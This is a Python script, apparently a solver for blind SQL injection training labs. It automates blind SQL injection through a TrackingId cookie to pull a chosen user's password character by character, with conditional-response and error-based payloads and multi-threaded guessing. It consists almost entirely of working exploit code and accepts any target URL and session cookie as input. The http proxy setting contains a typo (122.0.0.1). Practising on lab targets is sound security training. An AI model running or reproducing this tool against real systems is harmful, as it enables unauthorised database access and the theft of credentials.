import sys
import requests
import urllib3
import urllib.parse
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Proxies configuration
proxies = {'http': 'http://122.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def blind_sqli_with_error_response(url, username, base_trackingid, session_cookie):
    """This function is for Blind SQLi where a correct guess causes a 500 error. (Multi-threaded)"""
    password_extracted = ""
    print("Extracting password... (Error-Based, Multi-threaded)")

    # This function will be run by each thread
    def check_char_error(position, char_code, found_event):
        # If another thread has already found the character, stop immediately
        if found_event.is_set():
            return None

        # Handle the single quote character by escaping it ('')
        char_to_test = "''" if chr(char_code) == "'" else chr(char_code)
        
        # This payload causes a division-by-zero error if the character guess is correct
        sqli_payload = f"' || (SELECT CASE WHEN (SUBSTR(password,{position},1)='{char_to_test}') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='{username}') || '"
        sqli_payload_encoded = urllib.parse.quote(sqli_payload)
        
        cookies = {
            'TrackingId': base_trackingid + sqli_payload_encoded,
            'session': session_cookie
        }
        
        try:
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies, timeout=5)
            if r.status_code == 500:
                # Set the event to signal other threads to stop
                found_event.set()
                return chr(char_code)
        except requests.exceptions.RequestException:
            return None # Ignore request errors
        return None

    for i in range(1, 21):  # Iterate through each position of the password
        found_char_event = threading.Event() # A signal for each password position
        
        # Use a thread pool to check all characters for position 'i' in parallel
        with ThreadPoolExecutor(max_workers=30) as executor:
            futures = [executor.submit(check_char_error, i, j, found_char_event) for j in range(32, 127)]
            
            found_in_pos = False
            for future in as_completed(futures):
                result = future.result()
                if result:
                    password_extracted += result
                    sys.stdout.write(f'\r{password_extracted}')
                    sys.stdout.flush()
                    found_in_pos = True
                    break # Character found, break loop and move to next position
        
        if not found_in_pos:
            print("\n\nCould not find a character. Assuming end of password.")
            break
            
    print(f"\n\nExtraction complete. Password: {password_extracted}")


def blind_sqli_conditional(url, username, base_trackingid, session_cookie):
    """This function is for Blind SQLi using conditional responses (e.g., a 'Welcome' message)."""
    password_extracted = ""
    print("Extracting password... (Conditional Response-Based)")

    # This function will be run by each thread
    def check_char(position, char_code, found_event):
        if found_event.is_set():
            return None

        sqli_payload = f"' AND (SELECT SUBSTR(password,{position},1) FROM users WHERE username='{username}')='{chr(char_code)}'--"
        sqli_payload_encoded = urllib.parse.quote(sqli_payload)
        
        cookies = {
            'TrackingId': base_trackingid + sqli_payload_encoded,
            'session': session_cookie
        }
        
        try:
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies, timeout=5)
            if "Welcome" in r.text:
                found_event.set() 
                return chr(char_code)
        except requests.exceptions.RequestException:
            return None
        return None

    for i in range(1, 21):
        found_char_event = threading.Event()
        
        with ThreadPoolExecutor(max_workers=30) as executor:
            futures = [executor.submit(check_char, i, j, found_char_event) for j in range(32, 127)]
            
            found_in_pos = False
            for future in as_completed(futures):
                result = future.result()
                if result:
                    password_extracted += result
                    sys.stdout.write(f'\r{password_extracted}')
                    sys.stdout.flush()
                    found_in_pos = True
                    break
        
        if not found_in_pos:
            print("\n\nCould not find a character. Assuming end of password.")
            break
            
    print(f"\n\nExtraction complete. Password: {password_extracted}")


def main():
    print("=====================================")
    print("     Welcome to SQL Injector        ")
    print("                          @d4rkd3vil")
    print("=====================================")
    print("Select an option:")
    print("1. Blind SQLi (Conditional Response - e.g., 'Welcome' message)")
    print("2. Blind SQLi (Error-Based - e.g., 500 status code)")
    
    choice = input("Enter your choice (1/2): ")
    
    if choice == '1':
        print("\nRunning Blind SQLi (Conditional Response)...")
        url = input("Enter the URL: ")
        username = input("Enter the username to target (e.g., administrator): ")
        base_trackingid = input("Enter the base TrackingId cookie value: ")
        session_cookie = input("Enter the session cookie value: ")
        blind_sqli_conditional(url, username, base_trackingid, session_cookie)
    elif choice == '2':
        print("\nRunning Blind SQLi (Error-Based)...")
        url = input("Enter the URL: ")
        username = input("Enter the username to target (e.g., administrator): ")
        base_trackingid = input("Enter the base TrackingId cookie value: ")
        session_cookie = input("Enter the session cookie value: ")
        blind_sqli_with_error_response(url, username, base_trackingid, session_cookie)
    else:
        print("Invalid choice. Please run the program again and select 1 or 2.")

if __name__ == "__main__":
    main()